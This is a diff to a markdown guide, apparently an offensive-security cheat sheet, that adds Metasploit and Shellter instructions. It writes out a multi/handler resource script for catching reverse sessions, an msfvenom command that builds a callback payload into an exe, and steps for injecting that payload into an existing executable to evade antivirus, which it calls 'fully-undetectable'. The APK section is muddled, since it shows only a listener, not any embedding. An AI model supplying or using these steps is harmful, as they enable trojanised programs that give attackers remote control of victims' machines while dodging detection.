@@ -33,7 +33,39 @@ Replace [existing_exe] with the path to the existing exe file.
 
 # Embedding into Android Application (APK)
 
-Embedding into an APK involves using the Metasploit resource script.
+### Embedding into an APK involves using the Metasploit resource script.
 
 Generate the payload.
 Create a resource script (e.g., embed.rc) with the following:
+```
+use exploit/multi/handler
+set payload [payload]
+set LHOST [your_IP]
+set LPORT [port]
+set ExitOnSession false
+exploit -j
+```
+Load the resource script:
+
+`msfconsole -r embed.rc
+`
+
+# Creating Fully-Undetectable Payloads
+### Using Shellter for Antivirus Evasion
+
+Shellter is a dynamic shellcode injection tool. Follow these steps:
+
+Generate a payload:
+`msfvenom -p [payload] -f exe LHOST=[your_IP] LPORT=[port] -o payload.exe
+`
+
+Run Shellter:
+`wine shellter.exe
+`
+
+    Select 4 - Modify an existing executable file.
+    Choose the generated payload.exe.
+    Follow on-screen instructions to complete the process.
+
+Now you have a fully-undetectable payload using Shellter.
+
